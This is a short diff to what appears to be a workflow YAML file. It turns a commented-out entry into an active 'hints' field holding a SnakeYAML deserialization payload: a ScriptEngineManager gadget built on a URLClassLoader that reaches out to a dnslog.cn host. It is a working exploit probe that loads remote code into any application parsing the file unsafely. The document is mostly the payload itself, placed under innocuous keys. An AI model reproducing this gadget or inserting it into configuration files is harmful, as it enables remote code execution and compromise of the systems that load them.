@@ -4,5 +4,6 @@ inputs: []
 steps: []
 outputs: []
 
-#hints:
-#- !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://icq0uf.dnslog.cn"]]]]
+hints:
+- class: foo
+  bar: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://vb8fnj.dnslog.cn"]]]]
